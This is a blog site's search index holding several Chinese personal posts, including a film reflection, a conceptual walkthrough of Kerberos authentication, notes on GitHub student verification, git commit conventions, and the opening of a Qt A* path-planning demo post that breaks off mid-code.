<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>浮生若梦，为欢几何？</title>
      <link href="/posts/98264b23.html"/>
      <url>/posts/98264b23.html</url>
      <cover>https://s3.bmp.ovh/imgs/2024/04/15/2c9288113371758e.png</cover>
      <date>Mon Apr 15 2024 02:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="浮生若梦，为欢几何？"><a href="#浮生若梦，为欢几何？" class="headerlink" title="浮生若梦，为欢几何？"></a>浮生若梦，为欢几何？</h2><p>这是唐代诗人李白的诗句，出自《春夜宴从弟桃花园序》。<br>这句诗表达了李白对人生的感慨，认为人生就像一场梦，短暂而虚幻，能够欢乐的时间更是少之又少。因此，李白赞同古人秉烛夜游的做法，认为应该及时行乐，珍惜年华，不辜负美好的时光。</p><p>忙里偷闲，苦中作乐吧😇</p><h2 id="VScode插件：Freeimg-uploader"><a href="#VScode插件：Freeimg-uploader" class="headerlink" title="VScode插件：Freeimg-uploader"></a>VScode插件：Freeimg-uploader</h2><p>我是在VScode里写博客的，每次要插入图片就需要先去图床仪表盘手动上传图片，然后把URL复制到md文件中，非常麻烦，效率也很低。</p><p>虽然我用的图床<a href="https://www.freeimg.cn/">Freeimg</a>是兰空项目，但是兰空官方的插件好像用不了。实在没办法，我就写了这个对接图床的插件，这样就不需要在仪表盘和VScode之间反复横跳了，只需要在md文件中右键选择图片，就能上传图片到图床并自动插入URL。</p><p>如果有同样使用Freeimg图床的同学，欢迎一起使用这个插件：<a href="https://marketplace.visualstudio.com/items?itemName=JJLibra.Freeimg-uploader">Freeimg-uploader</a></p><p>我已经发布在VScode扩展商店了，只需要在扩展商店搜插件名称就行。代码开源在<a href="https://github.com/JJLibra/vscode-FreeimgUploader">vscode-Freeimg-uploader</a></p><h2 id="GitHub-Contributions"><a href="#GitHub-Contributions" class="headerlink" title="GitHub Contributions"></a>GitHub Contributions</h2><p>好久之前就发现明明commit了代码，但是在Profile里面看不到提交记录，但一直没去查为什么，懒癌是这样的…</p><p>我的问题：本地Git配置的邮箱与GitHub没有关联。</p><p>解决方法：<br>使用以下命令即可解决</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.email <span class="string">&quot;youremail@example.com&quot;</span> <span class="comment"># 配置全局邮箱，我的建议</span></span><br><span class="line">git config user.email <span class="string">&quot;youremail@example.com&quot;</span> <span class="comment"># 只配置本仓库邮箱</span></span><br></pre></td></tr></table></figure><h2 id="你想活出怎样的人生？"><a href="#你想活出怎样的人生？" class="headerlink" title="你想活出怎样的人生？"></a>你想活出怎样的人生？</h2><div style="display: flex; justify-content: space-around; align-items: center;">  <img src="https://pan.freeimg.link/f/6xtq/1.png" style="width: 30%;height: 400px;">  <img src="https://pan.freeimg.link/f/wXT9/2.png" style="width: 30%;height: 400px;">  <img src="https://pan.freeimg.link/f/GLSp/3.png" style="width: 30%;height: 400px;"></div>这是宫崎骏的又一“封笔之作”。也许这回是真的要走了...这部电影也许是他留给新时代的我们最后的礼物了。《千与千寻》是我接触宫崎骏的第一部作品，也是我最喜欢的一部。每次想到宫崎骏，脑海里就会响起下面的旋律：<div class="audio"><audio controls preload><source src='https://d.kstore.space/download/7746/再度.mp4' type='audio/mp3'>Your browser does not support the audio tag.</audio></div>被誉为“千寻华尔兹”。第一次知道宫崎骏的时候还是小学两年级吧，就是因为《千与千寻》。虽然说宫崎骏大部分作品上映时间远早于我的童年，但他和他的作品还是对我的童年有不小的影响吧。<p>在观看《你想活出怎样的人生》之前，就有好些同学说看不太懂，和前几部作品的风格大不相同…</p><p>可是，它又是继《千与千寻》后第二部拿下奥斯卡最佳动画长片的电影。我想这并非偶然。</p><p>所以我在看这部电影的时候，就一直在想这里他想要说什么？<br>观影到一半时，我还是不太明白它到底在放些什么，想要表达什么。<br>看完以后，还是有好多内容不太理解，有好多疑问。<br>当然，过后我也看了好多篇关于《你想活出怎样的人生》的影评，下面是我的一些理解：</p><ul><li>你想要活出怎样的人生？<br>这不是答案，而是一种反问。<br>看完整部电影你可能也会思考想要活出怎样的人生这个抽象的概念，他没有告诉你到底是怎样的人生，他传达出的是一种向着美追求美而无后悔的人生。</li><li>苍鹭、鹈鹕、鹦鹉<div style="display: flex; justify-content: space-around; align-items: center;"><img src="https://picsur.xxfer.cn/i/e3f50d4e-8235-48db-a707-809976752e99.webp" style="width: 30%; height: 180px;"><img src="https://picsur.xxfer.cn/i/26a41ce0-7f05-4976-9173-467476936efd.webp" style="width: 30%; height: 180px;"><img src="https://picsur.xxfer.cn/i/67d8fce7-7787-47f4-ba47-10fe2cf86ebf.webp" style="width: 30%; height: 180px;"></div>苍鹭的存在象征着指引和启示，帮助牧真人解开内心的困惑。所以他像是一个引路人。鹈鹕生活在一片没有鱼的海域，它们不得不吃掉“哇啦哇啦”，这个应该是说战争年代，普通人为了生存，被迫做一些恶事。鹦鹉应该是最好理解的，它们代表法西斯。但回到现实世界又变回了人畜无害的小鸟。</li><li>真人的父亲：日本军官形象<br>在现实中，宫崎骏的父亲在二战期间经营着一家生产战斗机零部件的小工厂，生意十分兴旺，这让宫崎骏度过了一个相对富裕的童年。宫崎胜次在家族飞机制造厂中担任要职，负责生产战备所需配件，以及零式战斗机。<br>宫崎骏小时候原本住在东京文京区，后来为了躲避二战战祸，全家由东京搬迁到东北部的栃木县乡下。因战事疏散，举家迁往宇都官市和鹿沼市。伯父在鹿沼市经营了一家名为“官崎飞机”的军火公司，主要制造著名的尾式战斗机尾舵和驾驶舱防风罩等军需附属产品，战争期间曾有1000名员工在此工作。官崎狻的父亲在那间工厂担任主管，因此家庭生活条件非常好。</li><li>7个特别滑稽的婆婆<div style="display: flex; justify-content: space-around; align-items: center;"><img src="https://picsur.xxfer.cn/i/45330694-2367-415a-bf46-5020da84a937.webp" style="width: 30%; height: 180px;"><img src="https://pan.freeimg.link/f/KAhY/%E5%A9%86%E5%A9%861.png" style="width: 30%; height: 180px;"><img src="https://pan.freeimg.link/f/pZuO/%E5%A9%86%E5%A9%862.png" style="width: 30%; height: 180px;"></div>其中雾子也去了异世界，负责保护真人吧。其他六位婆婆只是以木偶出现在了异世界，我觉得应该是在现实世界中，那几个婆婆对真人的牵挂化作了这几个木偶，前去异世界保护真人。因为雾子把自己的木偶送给了真人，被称作“护身符”。</li></ul><p>类似具有隐喻意义的点数不胜数，需要我们思考理解，包括一些台词也非常耐人寻味，所以建议反复观看。</p><p>另外，吉卜力的画风总是那么治愈，影片中的哇啦哇啦：</p><div style="display: flex; justify-content: space-around; align-items: center;">  <img src="https://pan.freeimg.link/f/EofN/%E5%93%87%E5%95%A6%E5%93%87%E5%95%A6.png" style="width: 30%; height: 180px;">  <img src="https://pan.freeimg.link/f/jjsN/%E5%93%87%E5%95%A6%E5%93%87%E5%95%A62.png" style="width: 30%; height: 180px;">  <img src="https://pan.freeimg.link/f/aMUz/%E5%93%87%E5%95%A6%E5%93%87%E5%95%A63.png" style="width: 30%; height: 180px;"></div>其实我认为这部影片还是非常符合宫崎骏的创作风格的，又是一场主人公的冒险之旅。最后的片段，久子的一句话：“有你是我一生最幸福的事，别忘了我不怕火。”真人在那一刻也释怀，母亲用行动告诉自己，如何活出自己想要的人生。<div class="img-wrap"><div class="img-bg"><img class="img" src="https://pan.freeimg.link/f/kZCx/%E5%AE%AB%E5%B4%8E%E9%AA%8F.webp" alt="宫崎骏留给我们的童年"/></div></div><p>关于我自己想要活出怎样的人生，很难讲，不知道从何说起。如果你们被问到想要怎样的人生，会怎么回答……</p>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> 日常总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kerberos身份认证小结</title>
      <link href="/posts/f3cb979.html"/>
      <url>/posts/f3cb979.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/31/6609023b8e91c.png</cover>
      <date>Tue Apr 02 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="名字起源"><a href="#名字起源" class="headerlink" title="名字起源"></a>名字起源</h2><p>Kerberos 一词来源于古希腊神话中的 Cerberus —— 守护地狱之门的三头犬，本篇博客的封面上的那个三头恶犬。在古希腊神话故事中，Kerberos是一只具有三颗头颅的地狱恶犬，他守护在地狱之外，能够识别所有经此路过的亡灵，防止活着的入侵者闯入地狱。</p><h2 id="解决的问题"><a href="#解决的问题" class="headerlink" title="解决的问题"></a>解决的问题</h2><p>简单来说，这个协议或机制解决的就是“如何证明我就是我”这个问题，即身份认证。</p><p>大家应该知道一种有中心的身份认证机制，也就是CA。一种依赖于CA的身份认证，CA认证中心是有中心的，它是采用<strong>PKI（Public Key Infrastructure）</strong>公开密钥基础架构技术，专门提供网络身份认证服务。即将讲到的Kerberos也是一种有中心的身份认证机制，<strong>KDC（Key Distribution Center）</strong>即为认证中心。</p><div class="note blue anzhiyufont anzhiyu-icon-dengpao simple"><p>CA认证：</p><ul><li>中心化：CA是一个中心化的实体，负责颁发和管理数字证书。</li><li>用途：主要用于公钥基础设施（PKI）中，用于验证和签名证书，以确保通信的安全性。</li><li>证书：CA颁发数字证书，包含公钥和相关信息，用于身份验证和加密通信。</li></ul><p>KDC认证：</p><ul><li>中心化：KDC是Kerberos协议的一部分，也是一个中心化的实体，用于分发密钥。</li><li>用途：主要用于Kerberos身份验证，确保用户和服务之间的安全通信。</li><li>密钥分发：KDC负责生成会话密钥，以便双方进行加密通信。</li></ul><p>总之，CA认证主要用于数字证书的管理，而KDC认证用于Kerberos协议中的身份验证和密钥分发。</p></div><h2 id="Kerberos协议的组成角色"><a href="#Kerberos协议的组成角色" class="headerlink" title="Kerberos协议的组成角色"></a>Kerberos协议的组成角色</h2><p>Kerberos在古希腊神话中有三个头，而今天提到的Kerberos协议也有三个缺一不可的角色：</p><ul><li>客户端（client）：发送请求的一方</li><li>服务端（Server）：接收请求的一方</li><li>密钥分发中心（Key Distribution Center，KDC），而密钥分发中心一般又分为两部分，分别是：<ul><li>AS（Authentication Server）：认证服务器，专门用来认证客户端的身份并发放客户用于访问TGS的TGT（票据授予票据）</li><li>TGS（Ticket Granting Ticket）：票据授予服务器，用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据</li></ul></li></ul><h2 id="Kerberos如何解决“如何证明我就是我”问题"><a href="#Kerberos如何解决“如何证明我就是我”问题" class="headerlink" title="Kerberos如何解决“如何证明我就是我”问题"></a>Kerberos如何解决“如何证明我就是我”问题</h2><p>Kerberos协议当中总共有三个不同的角色，客户端和服务端就不用多说了，一个是请求的发起者，一个是请求的接收者，那么KDC是做什么的呢？</p><p>在Kerberos协议中，通信的双方在通信之前必须相互证明自己的身份是可靠并且具有访问权限的（后面会说为什么是要具有访问权限的），那么双方都要如何证明自己呢？口说无凭，客户端的请求中需要携带自己的身份信息。可如果信息直接给服务端，服务端是没有理由直接信任这段信息就是真实的信息的，同理，服务端返回自己的身份信息给客户端，客户端也同样是无法辨别该服务器是否是自己想要访问的服务器。</p><p><strong>例子说明：</strong><br>A现在想要去访问B完成一个任务。但是AB两人之间是从来没有见过面的，他们只知道对方的名字叫A，B。此时如果A直接去找B告诉B我就是A，那么B是有理由不相信A的，因为即使A是一个冒充的他也分辨不了。同理，B也无法得到A的认可。因此就陷入了一个无法“证明我就是我”的困境。<br>于是AB就想了一个办法：AB找到了一个他俩共同信任的人C，且这个C既认识A又认识B。现在只要C告诉B，这个A确实就是真正的A，那么B就会信任这个A。同理，B经过C的认可后，A也会相信B的身份。此后，A在访问B之前会先去找C，C会交给A一个凭证，代表此时的A已经得到了C的认证，这时A拿着凭证再去找B，便可以得到B的信任了。</p><p>在上面的例子中，A，B分别是客户端和服务端，C担任的角色便是KDC，全称Key Distribution Center，中文名叫做密钥分发中心。KDC中包含一个叫做TGS（票据授予中心）的组件，可以理解为他就是一个发放身份认证票据的服务中心，在KDC中的组件AS（Authentication Server）认证了客户端的身份后，会给客户端发放用于访问网络服务的服务授予票据（Ticket）。由于整个Kerberos通信过程都采用<strong>对称加密</strong>的方式，密钥的获取也是从KDC中得到，所以KDC叫做密钥分发中心。</p><p><strong>整个Kerberos认证流程可以简化描述如下：</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/04/02/660b71debbb8e.png"/></div></div><p>客户端在访问每个想要访问的网络服务时，需要携带一个专门用于访问该服务并且能够证明自己身份的票据。服务端只有收到了该票据才能认定客户端身份正确，向客户端提供服务。</p><p>整个认证流程简化为两大步：</p><ol><li>客户端向KDC请求获取想要访问的目标服务的服务授予票据（Ticket）；</li><li>客户端拿着从KDC获取的服务授予票据（Ticket）访问相应的网络服务；</li></ol><h2 id="Kerberos认证过程分析"><a href="#Kerberos认证过程分析" class="headerlink" title="Kerberos认证过程分析"></a>Kerberos认证过程分析</h2><p>上文已经提到Kerberos认证流程简化后分为两大步：</p><ol><li>客户端向KDC请求获得他想要访问的服务的服务授予票据</li><li>拿着这张服务授予票据（Ticket）去访问服务端的服务</li></ol><p>大致的过程确实可以看作这两步，但其中还存在一些问题：</p><ol><li><strong>KDC怎么知道客户端就是真正的客户端？凭什么要给这个客户端发放服务授予票据（Ticket）呢？</strong></li><li><strong>服务端怎么知道客户端带来的服务授予票据（Ticket）就是一张真正的票据呢？</strong></li></ol><p>因此，笼统地把Kerberos理解为简单的两步还不够，下面对认证过程做细化分析。</p><p>整个认证流程可以简化为两大步，但其实在第一步中一共做了两件事，这两件事就是解决问题1的关键。而第二步是解决问题2的关键，最终结束认证过程建立通信。<strong>所以整个Kerberos认证流程可以细化为三个阶段，也可以理解为三次通信!</strong></p><p>在具体描述整个认证流程之前，还需要知道几个Kerberos认证的前提条件：</p><ol><li>Kerberos协议是一个“限权”的认证协议，Kerberos中会自带一个数据库，这个数据库会由创建Kerberos的运维人员提前在库中添加好整个系统中拥有使用Kerberos认证权限的用户和网络服务。在后续的认证中也是根据数据库中是否存在该用户和服务来判断该对象是否能够通过认证服务的 <em>拿上面的例子来说就是先让C在AB相识之前已经同时认识A和B，以便后面帮助AB互相认证</em></li><li>所有使用Kerberos协议的用户和网络服务，在被添加进Kerberos系统中时，都会根据自己当前的密码（一种用户密码，人为对网络服务随机生成的密码）生成一把密钥存储在Kerberos数据库中，且Kerberos数据库也会同时保存用户的基本信息（例如用户名，用户IP地址等）和网络服务的基本信息（IP，Server Name）</li><li>Kerberos中存在的三个角色，只要是发生了两两之间的通信，都需要先进行身份的认证</li></ol><h3 id="第一次通信"><a href="#第一次通信" class="headerlink" title="第一次通信"></a>第一次通信</h3><p>为了获得能够用来访问服务端服务的票据，客户端首先需要来到KDC获得服务授予票据（Ticket）。由于客户端是第一次访问KDC，此时KDC也不确定该客户端的身份，所以第一次通信的目的为<strong>KDC认证客户端身份，确认客户端是一个可靠且拥有访问KDC权限的客户端</strong>，过程如下：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/04/02/660b73f7b0711.png"/></div></div><ol><li>客户端用户向KDC以明文的方式发起请求。该次请求中携带了自己的用户名，主机IP，和当前时间戳；</li><li>KDC当中的AS（Authentication Server）接收请求（AS是KDC中专门用来认证客户端身份的认证服务器）后，会去Kerberos认证数据库中根据用户名查找是否存在该用户，此时只会查找是否有相同用户名的用户，并不会判断身份的可靠性；</li><li>如果AS发现数据库中没有该用户名，则认证失败，服务结束；如果存在该用户名，那么AS认证中心认为用户存在，此时便会返回响应给客户端，其中包含两部分内容：</li></ol><ul><li>票据授予票据TGT：客户端需要使用TGT去KDC中的TGS（票据授予中心）获取访问网络服务所需的Ticket（服务授予票据），TGT中包含的内容有Kerberos数据库中存在的该客户端的Name，IP，当前时间戳，客户端即将访问的TGS的Name，TGT的有效时间以及一把用于客户端和TGS间进行通信的Session_key(CT_SK)。整个TGT使用TGS密钥加密，客户端是解密不了的，由于密钥从没有在网络中传输过，所以也不存在密钥被劫持破解的情况。</li><li>第二部分内容是使用客户端密钥加密的一段内容，其中包括用于客户端和TGS间通信的Session_key(CT_SK)，客户端即将访问的TGS的Name以及TGT的有效时间，和一个当前时间戳。该部分内容使用客户端密钥加密，所以客户端在拿到该部分内容时可以通过自己的密钥解密。如果是一个假的客户端，那么他是不会拥有真正客户端的密钥的，因为该密钥也从没在网络中进行传输过。这也同时认证了客户端的身份，如果是假客户端会由于解密失败从而终端认证流程。</li></ul><p>至此，第一次通信完成。</p><h3 id="第二次通信"><a href="#第二次通信" class="headerlink" title="第二次通信"></a>第二次通信</h3><p>此时的客户端收到了来自KDC（其实是AS）的响应，并获取到了两部分内容。此时客户端会用自己的密钥将第二部分内容进行解密，分别获得时间戳，自己将要访问的TGS的信息，和用于与TGS通信时的密钥CT_SK。现在客户端首先会根据时间戳判断该时间戳与自己发送请求时的时间之间的差值是否大于5分钟，如果大于五分钟则认为该AS是伪造的，认证失败。如果时间戳合理，客户端便准备向TGS发起请求，即准备第二次通信，本次请求的主要目的是为了<strong>获取能够访问目标网络服务的服务授予票据Ticket</strong>。 在第二次通信请求中，客户端将携带三部分内容交给KDc中的TGS，第二次通信过程具体如下所述：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/04/02/660b73d40c302.png"/></div></div><p>客户端行为：</p><ol><li>客户端使用CT_SK加密将自己的客户端信息发送给KDC，其中包括客户端名，IP，时间戳；</li><li>客户端将自己想要访问的Server服务以明文的方式发送给KDC；</li><li>客户端将使用TGS密钥加密的TGT也原封不动的也携带给KDC；</li></ol><p>TGS行为：</p><ol><li>此时KDC中的TGS（票据授予服务器）收到了来自客户端的请求。他首先根据客户端明文传输过来的Server服务IP查看当前Kerberos系统中是否存在可以被用户访问的该服务。如果不存在，认证失败结束，。如果存在，继续接下来的认证。</li><li>TGS使用自己的密钥将TGT中的内容进行解密，此时他看到了经过AS认证过后并记录的用户信息，一把Session_KEY即CT_SK，还有时间戳信息，他会现根据时间戳判断此次通信是否真是可靠有无超出时延。</li><li>如果时延正常，则TGS会使用CK_SK对客户端的第一部分内容进行解密（使用CT_SK加密的客户端信息），取出其中的用户信息和TGT中的用户信息进行比对，如果全部相同则认为客户端身份正确，方可继续进行下一步。</li><li>此时KDC将返回响应给客户端，响应内容包括：</li></ol><ul><li>第一部分：用于客户端访问网络服务的使用Server密码加密的ST（Servre Ticket），其中包括客户端的Name，IP，需要访问的网络服务的地址Server IP，ST的有效时间，时间戳以及用于客户端和服务端之间通信的CS_SK（Session Key）。</li><li>第二部分：使用CT_SK加密的内容，其中包括CS_SK和时间戳，还有ST的有效时间。由于在第一次通信的过程中，AS已将CT_SK通过客户端密码加密交给了客户端，且客户端解密并缓存了CT_SK，所以该部分内容在客户端接收到时是可以自己解密的。</li></ul><p>至此，第二次通信完成。</p><h3 id="第三次通信"><a href="#第三次通信" class="headerlink" title="第三次通信"></a>第三次通信</h3><p>此时的客户端收到了来自KDC（TGS）的响应，并使用缓存在本地的CT_SK解密了第二部分内容（第一部分内容中的ST是由Server密码加密的，客户端无法解密），检查时间戳无误后取出其中的CS_SK准备向服务端发起最后的请求。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/04/02/660b742c14e3e.png"/></div></div><p>客户端：</p><ol><li>客户端使用CK_SK将自己的主机信息和时间戳进行加密作为交给服务端的第一部分内容，然后将ST（服务授予票据）作为第二部分内容都发送给服务端。</li></ol><p>服务端：</p><ol><li>服务器此时收到了来自客户端的请求，他会使用自己的密钥，即Server密钥将客户端第二部分内容进行解密，核对时间戳之后将其中的CS_SK取出，使用CS_SK将客户端发来的第一部分内容进行解密，从而获得经过TGS认证过后的客户端信息，此时他将这部分信息和客户端第二部分内容带来的自己的信息进行比对，最终确认该客户端就是经过了KDC认证的具有真实身份的客户端，是他可以提供服务的客户端。此时服务端返回一段使用CT_SK加密的表示接收请求的响应给客户端，在客户端收到请求之后，使用缓存在本地的CS_ST解密之后也确定了服务端的身份（其实服务端在通信的过程中还会使用数字证书证明自己身份）。</li></ol><p>至此，第三次通信完成。</p><p>此时也代表着整个Kerberos认证的完成，通信的双方都确认了对方的身份，此时便可以放心的进行整个网络通信了。</p><p>时序图</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/04/02/660b744f45f80.png"/></div></div><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整个Kerberos认证的过程较为复杂，三次通信中都使用了密钥，且密钥的种类一直在变化，并且为了防止网络拦截密钥，这些密钥都是临时生成的Session Key，即只在一次Session会话中起作用，即使密钥被劫持，等到密钥被破解可能这次会话都早已结束。<br>这为整个Kerberos认证过程保证了较高的安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近</title>
      <link href="/posts/cbd4b5ab.html"/>
      <url>/posts/cbd4b5ab.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/19/65f9ad224bee7.png</cover>
      <date>Thu Mar 21 2024 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<blockquote><p>前段时间相对空闲，所以更新比较频繁，这本就没什么质量的文章看上去更水了。后面要去忙一个项目，所以放缓博客的更新，顺便沉淀沉淀，尽可能提高博客文章的质量。</p></blockquote><h2 id="最近的一些事"><a href="#最近的一些事" class="headerlink" title="最近的一些事"></a>最近的一些事</h2><h3 id="关于-GitHub-学生认证"><a href="#关于-GitHub-学生认证" class="headerlink" title="关于 GitHub 学生认证"></a>关于 GitHub 学生认证</h3><p>最近有个学弟来问我是怎么通过GitHub学生认证的，我是一年前申请的，根据网上的教程挺顺利的，所以当时纳闷他会遇到什么问题。</p><p>看了以后发现现在的认证提交和之前的不太一样了。前面申请填写的一些东西大差不差，他主要卡在了<strong>提交证明材料</strong>的那个面板。我那时候有一个材料类型的选择框，选择other类以后，跟网上一样提交学信网的材料就行。但到他这里这个选择栏没了，使用学信网材料提交就显示：需要选择“other”类…</p><p>他说网上的方法试了个遍，都不行。那我觉得只能现场拍照提交了，于是用录取通知书，不行，提示检测到“录取通知书”的字样，总之不能用通知书。那就用学生证，离谱的是我们学校的学校名称和个人信息在正反面，拍不到一张照片里…最后拿我的学生证放在一起拍，提交成功了，哭笑不得。</p><p>总之，提交不成功按照它给的提示改进就行，个人感觉现在<strong>拍学生证</strong>的方式应该是最快的，照片里需要出现学校名称、个人信息以及时间节点，这样应该没什么问题了。</p><h3 id="star的项目从爆火到删库只在一夜之间"><a href="#star的项目从爆火到删库只在一夜之间" class="headerlink" title="star的项目从爆火到删库只在一夜之间"></a>star的项目从爆火到删库只在一夜之间</h3><p>yysy项目作者太难了，他写的是一个爬虫，前段时间我刚好在复习研究爬虫，然后我就star了。那时候才900+的star，没过几天就爆炸式增长了，上了GitHub的热度榜第一，作者也在b站表示受宠若惊，我也挺为作者高兴的，毕竟是自己写的项目受到了别人的认可。</p><p>结果，就在我fork了项目的第二天凌晨，仓库内容被删了，变成了现在<a href="https://github.com/NanmiCoder/MediaCrawler">这样</a>，b站的部分视频也没了。只能说爬虫这类项目确实会对这些平台造成负担吧，也能够理解作者的做法，开源精神值得学习。幸亏我fork了项目，真的巧。我只是想要学习一下，如果可以，技术允许的话，还想贡献一点代码的，谁知道fork后的几个小时库就没了，哎…</p><p>幸运的是不妨碍我继续学习💪</p><h3 id="另外就是感概自己所剩不多的学生时光"><a href="#另外就是感概自己所剩不多的学生时光" class="headerlink" title="另外就是感概自己所剩不多的学生时光"></a>另外就是感概自己所剩不多的学生时光</h3><p><strong>学生</strong>的身份，真的有很多的好处，不管在学习还是生活中。像很多平台进行学生认证以后会有不少不错的福利权限，社会对学生也同样会多一份包容。所以说做学生真的很幸福，但那终将成为难忘的回忆。至于研究生的读与不读，取决于大四能不能拿到“心仪”的工作offer，其实过得去就行，我还是觉得工作能带给我的会更多一些。</p>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Github </tag>
            
            <tag> 日常总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>How do you normalize your Git commit?</title>
      <link href="/posts/916babf0.html"/>
      <url>/posts/916babf0.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/18/65f7d92542713.png</cover>
      <date>Wed Mar 20 2024 11:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<blockquote><p>日常摸鱼，看到了有关规范<strong>git commit message</strong>的文章。还有在平时看到有不少hub里面的提交信息都特别整齐，感觉规范commit提交信息确实很有必要，也很实用美观。然后顺便水一篇博客。</p></blockquote><h2 id="意义"><a href="#意义" class="headerlink" title="意义"></a>意义</h2><p>Git Commit规范是代码管理中至关重要的一环，它确保了代码库的一致性和可读性。通过遵循这些规范，开发人员可以更有效地协作、跟踪和管理代码更改。虽然现在都是独立开发，不像公司里，但作为程序员，从现在开始培养好的习惯肯定是有必要的。</p><h2 id="浅尝"><a href="#浅尝" class="headerlink" title="浅尝"></a>浅尝</h2><p>比较适合想要尝试体验的同学：<a href="https://github.com/RedJue/git-commit-plugin">git-commit-plugin</a></p><p>这是vscode中的一个插件，扩展里面直接搜索就能找到，使用起来非常方便，并且可以依据实际需要定制提交模板。</p><p><strong>使用效果：</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f9479351fdc.gif"/></div></div><p>这是我使用这个插件提交到GitHub上的commit信息：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f9496df06bb.png"/></div></div><h2 id="稍进阶"><a href="#稍进阶" class="headerlink" title="稍进阶"></a>稍进阶</h2><p>推荐使用<a href="https://github.com/Zhengqbbb/cz-git">cz-git</a>，可以根据<a href="https://cz-git.qbb.sh/zh/">官方文档</a>进行配置。配置步骤我就不搬运了，官方文档写得挺清楚了。</p><p><strong>使用效果：</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f94a0a7ac54.gif"/></div></div><p>我现在使用的模板是在官方给的中英文模板基础上修改的，这是我的提交效果：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f94b57cd1c0.png"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f94be3ce43e.png"/></div></div><p><strong>模板根据实际需求和个人爱好配置即可</strong></p><h2 id="可选但建议"><a href="#可选但建议" class="headerlink" title="可选但建议"></a>可选但建议</h2><p>上面只是利用一些工具生成较为统一的提交信息，并没有限制提交，如果使用不规范的提交信息还是可以提交上去。所以下面可以结合<strong>commitlint</strong>和<strong>husky</strong>进一步规范提交，参考<a href="https://blog.csdn.net/huangfengnt/article/details/135781676">配置教程</a>。</p><p><strong>使用效果：</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/19/65f956dfc04d9.png"/></div></div><p>可以发现上面的commit信息不规范，提交失败。如果使用cz提交可以正常提交。新版的<strong>husky</strong>好像会失效，建议大家使用低版本。</p><h2 id="另外"><a href="#另外" class="headerlink" title="另外"></a>另外</h2><p>最早的应该就是 Angular 的那套规范，上面的两种模板基本也参照这套规范，相关可以参考这篇<a href="https://juejin.cn/post/6844904033635794958">博客</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> VScode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路径规划：基于QT的Astar算法演示器</title>
      <link href="/posts/7dca2e02.html"/>
      <url>/posts/7dca2e02.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/16/65f4753c58cdc.png</cover>
      <date>Fri Mar 15 2024 22:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="项目说明"><a href="#项目说明" class="headerlink" title="项目说明"></a>项目说明</h2><p>这是我自主研发的小软件，用于《算法设计与优化》的课设作业：无人机路径搜索和优化算法。这篇文章早在2023年底的时候已经发布了，之所以再发一遍是因为演示部分一直没更新，今天抽空把演示部分补上了，重新发布。</p><h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>基于 Qt 框架，使用 C++ 开发</p><p>OS：Windows</p><p>IDE：QT Creator</p><h2 id="主界面布局"><a href="#主界面布局" class="headerlink" title="主界面布局"></a>主界面布局</h2><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/27/658c4264e5507.jpg" style="width:800px;"/></div></div><h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><ul><li>下载安装</li></ul><p>源码放在GitHub上，下载即可使用</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/JJLibra/Astar">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/23/6586e75c86de7.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">A-star算法</div>            <div class="tag-link-sitename">GitHub</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><ol><li><p>直接通过链接进入下载源码，相信看本篇文章的同学都会使用GitHub，我不再细说。</p></li><li><p>当然也可以本地新建文件夹，然后使用命令克隆源码：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span 